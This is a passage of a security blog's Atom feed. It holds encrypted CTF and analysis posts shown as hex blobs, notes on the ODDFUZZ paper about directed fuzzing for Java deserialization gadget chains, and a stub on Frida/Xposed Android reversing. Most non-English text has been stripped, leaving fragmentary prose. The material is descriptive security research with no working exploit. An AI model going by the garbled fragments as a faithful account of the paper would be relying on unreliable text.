83a02a8b423378a1e8788db9e9b5293718d69f107be4e2e065cf5467cbed2057b50bf4be69f411ca28e309fec810367f1f33367829d804aafb28ba4cf0d79f01736724133cf57bb0d0fc8cc5baf860f14983761938b8393aa12bb3905ed9acaf2ec9e86a473900dca12ade472a98a86d97038e1939255e26d65d40c78178fa5eed9a0835fcaea5861ef3ed6d2e405d9087ddaae55d5c0fff64fe963a45161cba8bfdd795e4fe39200a71ed1e137718bb566db0e3fbbc6a591bc4d3cffb318b7687ff379383b3387e03318dcb4f36f3c9d0aef2fc69027a00a55c8db0c191391f58f311fb66cf9b88c49e4c0162f82ccfb5c548828dc5f2f25a7a8a3e19c7633c23118d29537cc30f45c2e310afb3b7a1d8c2362</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="static-analysis" scheme="https://wd-2711.tech/categories/static-analysis/"/>
    
    
  </entry>
  
  <entry>
    <title>image-caption</title>
    <link href="https://wd-2711.tech/2023/11/09/image-caption/"/>
    <id>https://wd-2711.tech/2023/11/09/image-caption/</id>
    <published>2023-11-09T12:40:05.000Z</published>
    <updated>2023-11-09T15:12:45.214Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="efee00fe29306bb6f74618ed63483a0c6cb21fbeadfdd67995157d5f0d9d0f5a">2c151d14a1692af99fa0c574696ab642630118ededbcd92b05c804024ee0b0d5784e5f9388d434a5c321c8d021f3f8246f5a54578a877ea73abe19814aa8afe14024f8ed219de0207d352a4634ef848c4d9d940bb7e338ccd1164da41540f8e1390861866e2a48044eda0d473230942400378a5df916b15c4d22e5cf5901429ab23c3d305bbd91b8ef8e66b934e10ea6f84f9615d30ce595942037a1ff9eba3546fb5227175fdb409b241f340796325aa0fe456d5fbcf229da8febd4c0c100c851b2990a9ebb514cbdd39ce961be74f1dec3c7ef99a9041fc0339bd419abd804f422d0c51698b83f146387d68c3a723d2ae884f7ad1cc85b153ffed783bddf9cb45865acbb48af3178a9bc4aaf6fc6c06f69b27148d4f9f86299dfd86089d4646bab7cf3c36d26ab11cb5e321589d44f8320ad2353c9635577f68af49f6dbdfbbb5646c18902e76d654b52afc46400ca1428bfed20cd308345b6c46646507709cbca233fec13be740cf0b54453dd4f88bd484d2b74ee836d46c74f8998bb0a58</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="ML" scheme="https://wd-2711.tech/categories/ML/"/>
    
    
  </entry>
  
  <entry>
    <title>oddfuzz</title>
    <link href="https://wd-2711.tech/2023/11/07/oddfuzz/"/>
    <id>https://wd-2711.tech/2023/11/07/oddfuzz/</id>
    <published>2023-11-07T12:15:44.000Z</published>
    <updated>2023-11-15T12:29:50.134Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing"><a href="#ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing" class="headerlink" title="ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing"></a>ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>&emsp;javaODDFUZZgadgetpocODDFUZZ</p><span id="more"></span><p>&emsp;ysoserial3416baseline 36CVE</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&emsp; OOD 1GadgetInspector2SerHybrid sink  source</p><p>&emsp;1javagadgetgadget2fuzztestcasesinktestcase3sinkpath</p><p>&emsp;ODDFUZZ12gadgetfuzz3step-forwordhybrid feedback</p><p>&emsp;java fuzzJQFODDFUZZ</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="ODD"><a href="#ODD" class="headerlink" title="ODD"></a>ODD</h3><p>&emsp;ODDOIVODDjsphp.NETopendynamicinvokejavainvokegadget</p><p><img src="/images/oddfuzz/image-20231108211644048.png" alt="image-20231108211644048" style="zoom:67%;" /></p><p>&emsp;POPPOPPriorityQueue</p><p><img src="/images/oddfuzz/image-20231108213655198.png" alt="image-20231108213655198" style="zoom:67%;" /></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="/images/oddfuzz/image-20231108213822316.png" alt="image-20231108213822316" style="zoom:67%;" /></p><h3 id="-DGF"><a href="#-DGF" class="headerlink" title=" DGF"></a> DGF</h3><p>&emsp;CGFDGFDGFfuzzerPOC testcaseDGF</p><p><img src="/images/oddfuzz/image-20231108214859002.png" alt="image-20231108214859002" style="zoom:67%;" /></p><p>&emsp;12fuzzingfuzzerfuzzerseed poolseedseedfuzzerfuzzing</p><h2 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>&emsp;gadgetgadgetgadgetCHAgadget</p><p>&emsp;gadgetInspector<code></code><code></code><code></code><code>gadget</code><code></code>gadgetInspector<code></code></p><p>&emsp;FUGIO<code></code>gadgetjava ODDjava</p><p><img src="/images/oddfuzz/image-20231109214851761.png" alt="image-20231109214851761" style="zoom:67%;" /></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>&emsp;POPgadgetfuzzfuzz case</p><p><img src="/images/oddfuzz/image-20231111105100799.png" alt="image-20231111105100799" style="zoom:67%;" /></p><p>&emsp;generation-based fuzzSerHybridpoints-togadgetfuzzerComparatorTransformingComparatorFUGIO</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>&emsp;gadgetfuzzertriggercodesink</p><p>&emsp;DGFsinkseedsinksinkfuzzfeedback</p><h2 id="ODDFUZZ-"><a href="#ODDFUZZ-" class="headerlink" title="ODDFUZZ "></a>ODDFUZZ </h2><p><img src="/images/oddfuzz/image-20231114195459925.png" alt="image-20231114195459925" style="zoom:67%;" /></p><h3 id="A-"><a href="#A-" class="headerlink" title="A. "></a>A. </h3><p>&emsp;programjarwarclass filegadgetgadgetseedfuzzfuzzing loopoddfuzzseedgadgetfuzzersink</p><h3 id="B-"><a href="#B-" class="headerlink" title="B. "></a>B. </h3><p>&emsp;gadgetsourcesinkcall graphCGjava<code>gadget</code></p><p>&emsp;<code></code>oddfuzzoddfuzz<code>this</code><code>Assigin/Load/Store/Call</code><code></code>gadgetsgadget</p><p>&emsp;<code>gadget</code>oddfuzzsink1630sinkA1gadgetInspectorBFSgadgetsource gadgetDFSgadget23javaCHACHAgadget4oddfuzzCG5sourcevalidatorgadget</p><h3 id="C-"><a href="#C-" class="headerlink" title="C. "></a>C. </h3><p>&emsp;javagadget<code>oddfuzzvalidation</code>fuzzing loopB1</p><p>&emsp;<code></code>1gadget2sink<code></code><code></code><code>gadget</code>gadget</p><p><img src="/images/oddfuzz/image-20231114215527381.png" alt="image-20231114215527381" style="zoom:67%;" /></p><p>&emsp;<code>gadget</code> Comparator comparator  TransformingComparator </p><p>&emsp;oddfuzz gadget validate<code>gadget</code>fuzzerfuzzObject[]null</p><p>&emsp;<code></code>sinkfuzzfuzzersink<code></code>sinkoddfuzzgadget coverage</p><p>1sink DGF ssink$T_b$</p><script type="math/tex; mode=display">d(s,T_b)=\frac{\sum_{m\in\xi(s)}d_b(m,T_b)}{|\xi(s)|}</script><p>&emsp;$d<em>{\boldsymbol{b}}(m,T</em>{\boldsymbol{b}})$sm$T_b$<code> s </code> gadget $\xi(s)$fuzzer</p><p>2gadget coveragegadget coveragefuzzerpower <code>gadget coverage</code></p><p>&emsp;oddfuzzoddfuzz poweroddfuzz</p><script type="math/tex; mode=display">p(s,T_b)=\psi(s)\cdot(1-\widetilde{d}(s,T_b))</script><p>&emsp;$\psi(s)$gadget coverage$\widetilde{d}(s,T_b)=\frac{d(s,T_b)-minD}{maxD-minD}$<code>fuzzer</code></p><p>&emsp;<code></code>fuzz<code></code> JQF<code></code>oddfuzz sink</p><p>&emsp;fuzzer<code> booleanintfuzzer JQF referencefuzzerclassfuzzer random.choose() random.nextInt() </code>Fig.7.</p><p><img src="/images/oddfuzz/image-20231115194857259.png" alt="image-20231115194857259" style="zoom:67%;" /></p><p>&emsp; size  PriorityQueue  int fuzzer random.nextInt()  1fuzzerrandom.choose()  gadget </p><p>&emsp;sinkoddfuzz random.nextBool() <code></code>fuzzerfuzzerfuzzergadget coveragegadgetfuzzer truegadget</p><p>&emsp;$\sigma_{2}$</p><p><img src="/images/oddfuzz/image-20231115195815150.png" alt="image-20231115195815150" style="zoom:67%;" /></p><p>&emsp;gadget TransformingComparator.compare() fuzzer Identifier  true  TransformingComparator Ttransformerfuzzersink</p><p>&emsp;sinkfuzzergadget</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>&emsp; Java  JQF  oddfuzzgadget JQF <code>tai-e</code></p><p>&emsp;<code></code> oddfuzz  Soot  Java  Jimple  Jimple </p><p>&emsp;<code></code> <code>oddfuzz  JQF  junit-quickcheck  gadget </code><code> JRE  sun.msic.Unsafe</code> JVM </p><p>&emsp;<code>Instrumentation</code> JVM  ASM  javaagent  Java  PUT oddfuzz <code></code>gadget</p><p>&emsp;<code></code> JQF branchoddfuzz  ASM  gadget CFG CFGgadgetCFG gadget fuzzeroddfuzz  gadget  CFG sink JGraphT </p><p>To be continued</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing&quot;&gt;&lt;a href=&quot;#ODDFUZZ-Discovering-Java-Deserialization-Vulnerabilities-via-Structure-Aware-Directed-Greybox-Fuzzing&quot; class=&quot;headerlink&quot; title=&quot;ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing&quot;&gt;&lt;/a&gt;ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing&lt;/h1&gt;&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&amp;emsp;javaODDFUZZgadgetpocODDFUZZ&lt;/p&gt;</summary>
    
    
    
    <category term="papers" scheme="https://wd-2711.tech/categories/papers/"/>
    
    
  </entry>
  
  <entry>
    <title>blog-migrate-test</title>
    <link href="https://wd-2711.tech/2023/11/03/blog-migrate-test/"/>
    <id>https://wd-2711.tech/2023/11/03/blog-migrate-test/</id>
    <published>2023-11-03T11:46:36.000Z</published>
    <updated>2023-11-06T12:45:46.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>test</p><span id="more"></span><p><img src="/images/blog-migrate-test/image-20231106203331118.png" alt="image-20231106203331118" style="zoom:67%;" /></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;p&gt;test&lt;/p&gt;</summary>
    
    
    
    <category term="" scheme="https://wd-2711.tech/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>ACTF-2023</title>
    <link href="https://wd-2711.tech/2023/10/29/ACTF-2023/"/>
    <id>https://wd-2711.tech/2023/10/29/ACTF-2023/</id>
    <published>2023-10-29T07:27:19.000Z</published>
    <updated>2023-11-03T11:45:43.106Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d9b3a03e3e153d036277dc89aa77374bc1b84efeb0c015576d6d883ec5019b81">2c151d14a1692af99fa0c574696ab642630118ededbcd92b05c804024ee0b0d5c33d136ca7235af03d566c7c3a95470f96acb84bd1a4fcecee982ed4116f2d6d2629479380fae66c7926a983c377862100352fbe125880e6cb124905b9ae6d357ec2188ff0b91db24de00cd0e4a72d9558bfa6c836774447ed250cdf28d4019fcb1fd8f2c2ab2b42ea49d2fdbceab2567b70ff1695fe2103cf9781c28b9d8918ddad32968c689f77b940ceb8a9f9cbe185487269f55f803b1675f0bf4c173aac0b3c3899f4f19b9cbdf58faff257b8810c9c207ded93b360cfa909c772bbe67747f4b20bbefc155338a1b3e0d2788fca5b918fb85ee435b1cc816f95344288cfdf4f4c92da259ee72a9ccc26af0d8a7ec0c03450a4c54268f796a97e9eb87dca1249f478e28af191785ca663d508f23ca01a539796f081d8d9e8dbb450c602e9d73de54aa8845885e5ad73124fb8395ebc67ae27650d19ace2d26d733d4532caffef461f642ca627ffed5d2bff42a2f221c21137d703537b451946b43bd0653fbba819c07cba445d94c0bed9d86b62853fbbc1d906b3b51446b1bc4f9232e117a61a86b86ddead0318af0ff415ef13e38b7ef6087928d66ae29f829c355f29d181f582a472eef1a6fc232b3e7e15469ccca50257393bc6f38fe4f224ccf3aef3d47c5f07b70e086df7a1847a2bb2bcdd6437059b78ddc655ebde390eaba30b837d2b9ba49861e642474e5cffe5c29a081b8bd3b1ba3296af6879a768e7732325924ff4bdaa26855cc040470f4e410c4d5f425d2a0619981361fd3835228c45905d5872d59c0d5097dd76179211ff063f4f15fb822df55946b5fb7ccedef3576cd511638e0fa9f1213b0d3a4cb0d06629402017ba8632e694269054a21e1cd255e625022a76441358fd527f5fdeba3bdfcf5df324e3d3ec49a727e2d960f56d69deecd05547e5873ace08ee71acd27a22d961038942c7e2e9bc440f81d8c444b0a452b2b34bd87181fa119376cc680cfb0f0c5cda7d8f6e9099568aea29d2a1f469e8ff78705a7d3aa21eaadbe03376fc8ac2e881adc4601ce80ca8ecaa3cd2e2a0a0252b804fb7f525576617c6d958cd2d56a5e83c5537a2d2f9bee44219dd46af37b9864ffaf03ed3409f1b6ee54da0d93640a4bf2f88aa85ad4684f93e9dcadc9e1ca474e555172b513253d9f58ae618d00b5c0629cf4ac2c987fafed4703f012d7b3ef179d8c2f4ea92eb37d8819afba6005b10fc34994bf2d56268cc302983555eb1c33cc44623b83b77dfacda39131202f5c262ffac1c0f3e9d2bc3cabd3dfb63f00e6b9f4aec4e07e940f4e7ad5f7f351cf7669d107a1288cebfe89ec1e7a5d766dc0e1b85c15bb3caaca28f68eac503fda7726de296ae96234b7e81c633f28897664e96c94818f4881fa369b22835883f27c11a28ba550bae40d61781e1d6403f9eebd080f6e25ae7e21312bc179146d4a6f6fd74435607dd1caa5c2a65a99330dfd4089764874935b74701299e3bb20a37375a9c07a9a0ccd27fe65b512f354fdd2b79e113131d0754144752fffe601de582cb47f5319c819a1fd4602d4c0cb93b3f59cbf8f0928c4c5706698cfe0e2d702a5eaa66979ecf2c7a9a42e681fe41e05b3280910b73cf4bfaf729a061ad161a710798289a313077c2af42eb22b9c11b39b6ac651111a67749dc85b2437e9069fb28ab7a295cfa958a6bc0d72816c89a0079a8f37a9cd2d1d4c340f430d0c4aef12b149e36845f9f4c76a944d61a910f29ea92daa1d6e67f975ce56c95f4dc8b9eef3316f30ddb6b79bb94e619b1001a63130bb682d5e480bc2cd992b91fc56692f878c9179452a86a84332a41410097eaa2320c7bcab3ce72b62732f1e3b2dc647dd65d49656187076465ac79f35859f4b6ce1b13aba5e4e9278945ea8f26a61ec90a35e1d3d6fe04f0f76938beb9c33d2a7c0763e4a6cdb5d80d11ef6b23189b9d4dc3f894401fb6aad799a0ae701700b051c15bae32e53b368cf91b8e2e5e1d9be6c9722157ced2495b22f08c83f614b557905643730313df3a6e4cc01bb1f5ee38015f254e9e300f6c935f4c6e001908799a4525dc710b27890d3511abc6a6570ab84b26b68886db6530551b7be6b234743132aeea576194d7997a19a8de8a69620632b8e1383c5c269e170eed33d933e5a43c7f0c7623c9949a87a197779d5b3240941d11385def80c236fe03d7ea16bacda0c9b52547cf5ad13ecd5db37ad97942bd5982f03928b0285a0a31021e2e991cabfb68cfefcca47c493f13ef8e8d7af4aac8899609009cebd5ceb7bc7d0973729fcb0cc9447a7cee6a1b9e63c98f42ed605cd3dccfda9deba70a270c1b348131b6fe5876dbbce4c7f95e663dce0303c362e91d06fb82e9182cd1ff47209e2323f0c5094c889ca3028afbdea4493c488eb054704df2e34d89e8be32e4d7c3f57b98db9858acc0de3593a9d16673dc19d7b40e166c7f7cac0a7f9aa17574bd71719fc902bcca4717deace1f595c9bfb0dc24be78c573ffe236bf80ce9e78853bab84b4c116ad3ee99913204b3c7f81cfa413fdb643cf5f46710844349835b77a046cb53754309a745d332b3acc781428ad3d2a928e7b84e88d0cebaac5355211b72bc15ab820f6e7ec3594b35871064155b1fd1801252e2c2f55979bd1ec3417502fe5c676fa6ddf3527858244806a0e21b02e90eb244aa6e9f110022a0fd9c35cae38fdf92d6476c83930c96fedec036e3512a578107381e73f99cbc153b9d46f30d3e08b42d1c9ac55976b5de0ec494afffcdf39d5d981e8c0490adc2a77cf280a562bb78ab1c1f850d6f529a46522c5f485c47af5aa6aac62b90b8803a70526b618927cb2b5a6f09ad51370dfc380b81f0e8f5921a52223e1dcf94daacf6367f60e02217121bb1953344d0f898b8057fef51073cd9f7b8e58c01014b07dd2ef7875d24bbec734d1750a1e772e43777930831e05b5d36ad03c29a9e5b5ddf76bc7479862027a49ef8587314f1a13c25f92fe46411c7f1233bb1d8c6daf8584c44709ae3c4a3a7249e02d7b33e22ab9c23c8e8b4f024ca335bb1c6dd087c341bc326f794a10db7c36cfd4a935dccf31a74742a4ea1886b746731843e281f7a6447576f0f575f942c78516fc69e94e61798ab50bdfda521c5ded90987682829fbbe5be500bd9d487d508aef4e5e536bdfc3ea7d9226e9afcbfa19ea5a3dc033946b540264b71853abd97ce3d935ae1df61a40d5ed80e17dec00b8b006a8dfba222c0e871592d45362734fa05f496d76df83821ab10e6413315f8087fe32795c15b59131735f0a6645409a430e59e6cdfe0bd2e945af4f64b87ed58a7fdba61440dbdfbbd39f11e2e54a9ecf95813b24b4a80aab9e27a1e0a6f5a88e47359f2620a7275927d76cfd78b0a0ca8de62ac201e971f69374ad612c61d185fdb39b05d33cf951f3ce9099cec77d1e7dcea86d04b548b6faf79c90e247f280a5cb09dc046c052b06c466ac797f1416b6e857fe43c8130288e46b2fa4356d50bb7de1ba01dcb4be8a1a95acc4775cf983f3e8b76e43f7562292ebe3c72628343c395d8920aefbeb79380d0ecb5e92606e679062beb5ad2a10b646fc9889cb67017699f145cdc24edf8742a72be30179e75983a6cb50892bde229a71e2dcdda3fb7a44c3e118157da125d812fc953bfbe732903121299c813809a7cb61e6b453266288f200929e0bf9ca8a36dc7b21c4f3a6ebbd175cc1cb05b5824727b21765533ab58a43c548607ff5db8ce76018c35365ab77c6937c14ce8e1f6b765505de0eda0eb46d5f722f231b54a96054c48f936cb00bc7b3f118da2069aded1f92de75758ff210b3fb7361bdfd4cdb83f50e35a78143cbb642b848aa6b929309c51573f15e0516de37177c1bac31089b6b650b71adcafa219253f1f43915af84a3ae4e1a89e589d6720ec5fe4fa4f9fc865fc7bc57038319b8203dd7b9ab6b9032f496301df4b9274c918147b5a05ea9f8f6d804c530a7b4b526963064bca20259406b399e60377f4b6679ed38c19d60ede8ca90ca4d8750524944857f9fe7c0365b0e6e79c972a87a5ab0ba61e49a9728950d018b6ef6e9dac2da8623d3037ac6465ece421420d790689bac1622533ca7518227e28f53bced8e4c967a8fc1f2292ed6f0db569d6d9197a18b67a3e2d25d274bce3aeb54f47fd89bd1327e74d2427d35b7fda2edc5972a74541b26eeab234944f06dbc0fbe602cbc4b67ca7bb5dbc1b7dda156c5a3b76fa454250fcccb11256a35b5b2d57fa4bf8a36e3f176abaa290821e81702cc949b381cf323df4cf5443e0aa1ee6cf2626d87b19bad07447282710ba6965c2af3576d342a4322605123925c652e879863af7baa96d6199e23b29a3f78a3e55316b98a25cb040bb13f8257883a1d95d39a1843a8ad4af0ab79cb217af2281b3fc077e534cacc353ebf06c698911670d770b5c5d19906c655ee2f5fc7e35bc1728ee449ccea37c9b2803b42d1e507e750e1a60cd55b0c4313361041c66bde45765b56f11542156ae663f5b3632940cefc670ef54b91086c5f3c5b3f6a435d4c2a69bf957b051b7a18349fd1c5761bc0752a660ab81c5eb43cf0f06a305ba163b6a890038352eceb413a0f70523a1c7b459747aea0a150c6c776d0a0393b548a74a6c6f41984ee4ea696dd1bc9a4822cab995e10479fbb48f2edbba71a053089ba76b11514c928368b7d611affd3f72705c8633ece3f57fb0b944d1d404619bcf915c276431a8321d75090b77c7a0118df0ee2ef967136db4641bef88535f9f49a3d818ec7819e730fed49837b3d9cf58e342388330a86ee906bb6b2ce04b9cb40c73eaadcfa6094df63a9ec3a46736717addda1660922c707aee61a84e5491e27f9e4c17f2998ccd0c3c53be3e3c5bf4596486116650e65b3a5e7160da4cca94188afafd1ecab929113b5caebedd4fe0401dfd3fa382800da147b0c56e5d2a8d58c22dba4ee84a3fa2932afdeb7882b3f4fbd45394a7fc827f2e66754792a467ba75b4ea27270e58d3fd74159a08bfa72ef583d13d6b643dcf9feaecec1e11005030cc4fe477ff3290348e57542ad52f62d0587fbc1a7f550688c84a712c347d9c5dc7d9d70634f5785826384c5dd675b77157948da304b5932ceff68301ab29d843d789e5079c8ed0e0bd8a74b288808082adb5640e373dabc2704e0054f735bfebf573e2f19feb75739754d5cd6cad846b0100c782e3639a34bac1323aad653015f4d1b1c26935dbe13e60cc9962e14d705a224834c93e3ed2876e5881c21900e82a977d5e0e48f90db390330cee8881f5a7761a5e265c1de6f44a89ba08a9cb566ab7a848369d9b958a26fd74a07cddef882f37d6eb1d778cb2e8fb01888c8dda8c2e1a22bd0498ae7f1a0272f6a4738794d6428b7b9968c9ccf4f457b3447e2842fb91710307e1270244befbbd10fad068e7dc41581d5c2be4e45b33e81242ab91dd6fdbc550e4a94718deaba3af1f831092df7a959b4e6c9f3f5748d9e2e21bc07be1621dfcf2176c277745990bad190a7ac27468b527787e01596c854f7f73d1c307b8af398e96bd554b44ca3505f17a71313779280dd2a2020b6073dc8e7ed1d9c582e8aabb85e002db69912c63cf3ec2fe7a02802bcf0f9c5b222b57d41df08cfe5de4d0b94ae5f00cd5833c9738c4622986d26b03248af51527b322bdf933e4aa54dde64b8a8ff0f11346ad53edd86494905f5f6f78fa3afebdbf2d3b0aa182d082d9069fa31de886f7ee7fa4f11183912065bbcc746d04751730c2e01e05caf80d34974cf0de9b01abed577f9349dd4f22b8d8d68b75982a3664cfc31d34240c95884a4bf8407a80b6aea9ec5c08a87d7d421110d61808b67d46e6c9863535d2ae53c2affcc6158109e3f0a6268010858925c6a757b4812c47bfd7aa775a71b4b47f1fd4f196825960e2a8ef1a4d5db582760f96295b45b9734909c1b36b6d501892b54cf23cac4a1cf9880ac48098509d5045ffbfa2e9bbebb2fc3c96207c93839bdd0f82f6cefe7408938ad58ff708b76d246c4b8903bd0ea0926c49502532395ba6a6241d06d39dca7b5846d4367f0e6fccbe82a9add756b29023ab84bdee5465fbcb903643d54382a0867171c95c66b2d3532db9d39b9055aaea822657ce3b4b4d1dae5fffe17f71ac54417127bb5343a0d0ab56229dac8d0151b539df47f2a473007e3f1d2968a20916543888245a9b91dece2f58d409a0a07269ad198c8520cb26081681b8653c77eb5e8d73d67ff63f524a7fb35a0d1ba1c2a812c547e83c14b0174b2f00c9987807ac487bf49a162d672c5d3139e7d874a20867d5ff0dbcb286aa13d7301775adaa0a2ec9daf1832767173abce229bd2ab42628fad002561c2979ba46279558a73bdbf939bdf5f41b43d4470d96c0f21df8c7da4ac31014f60df3def9ee048641522014fc38f080155625db38e447c582ba76b0b9b08a023f11d1e58a5978eeef25c7aa01b70c0e859a685cdd2d17b1fa3fa3e6f1f5d440de1e60970157100f4d392489dcbd60bce35bc19d0ba5b010506d1d2124364d24f423086c201154ef8ed6e4474bdd5e379543f89b5ebbb5a9f8fd647fa5a9ab3755de273c1c64ba5b46638772cf61d714370acb4f10e53b249a1273e65c320164ebf859a67fbc65bb1fb7e547edfd17a03eaafd05ab7f2c02c5a58e0f043ce6288d1c59072f678fe1f7ad8a1908a322eba5cee0208bcd256dcb655458b892330fe2d53bc4aca74036d29263b81c654699995d520d04ad854549b70b1092988200793f2de4814cdc125ae78d880a4af76813eb2191c843277d1a9796db4f76d031cbbe776c3cf3c8ff5379b3f49a359fef31858494d06856c4e140c9590d70eab49dd9152f96025b9acda3ccd868bd25ed256551bb131bd658f703cc4bd7fa47d4cf17374432b2add54115087723d504005f5eb2f2f33a62fbf3097ed490e5eb40bc8a4a8faae954d1b580ca95ac615e461911e9fb6abe28a82b8b5435e436791ee81527c42a992d77822001fe792bd823c91c467e7f8c3efadf1ee06ad7ca466893d80074cc719270de4c655b037412bf2c0df2ef687514d286f8577dca90219f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="re" scheme="https://wd-2711.tech/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>frida-reverse-analysis-3</title>
    <link href="https://wd-2711.tech/2023/10/22/frida-reverse-analysis-3/"/>
    <id>https://wd-2711.tech/2023/10/22/frida-reverse-analysis-3/</id>
    <published>2023-10-22T08:58:01.000Z</published>
    <updated>2023-10-22T14:24:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Frida-3"><a href="#Frida-3" class="headerlink" title="Frida-3"></a>Frida-3</h1><p>&emsp;fridaAndroid</p><span id="more"></span><h2 id="0x05-AndroidXposed"><a href="#0x05-AndroidXposed" class="headerlink" title="0x05 AndroidXposed"></a>0x05 AndroidXposed</h2><p>&emsp;appxposedjavanativehookollvmvmp</p><p>&emsp;xposedxposedxposedXposed Checker</p><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>&emsp;AndroidXposedXposedandroidandroid12G+450G</p><p>To be continued</p><h2 id="0x06-Android"><a href="#0x06-Android" class="headerlink" title="0x06 Android"></a>0x06 Android</h2><h2 id="0x07-Android"><a href="#0x07-Android" class="headerlink" title="0x07 Android"></a>0x07 Android</h2><h2 id="0x08-"><a href="#0x08-" class="headerlink" title="0x08 "></a>0x08 </h2><h2 id="0x09-"><a href="#0x09-" class="headerlink" title="0x09 "></a>0x09 </h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Frida-3&quot;&gt;&lt;a href=&quot;#Frida-3&quot; class=&quot;headerlink&quot; title=&quot;Frida-3&quot;&gt;&lt;/a&gt;Frida-3&lt;/h1&gt;&lt;p&gt;&amp;emsp;fridaAndroid&lt;/p&gt;</summary>
    
    
    
    <category term="re-book" scheme="https://wd-2711.tech/categories/re-book/"/>
    
    
  </entry>
  
  <entry>
    <title>N1CTF-2023</title>
    <link href="https://wd-2711.tech/2023/10/21/N1CTF-2023/"/>
    <id>https://wd-2711.tech/2023/10/21/N1CTF-2023/</id>
    <published>2023-10-21T03:07:00.000Z</published>
    <updated>2023-10-22T08:45:40.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" 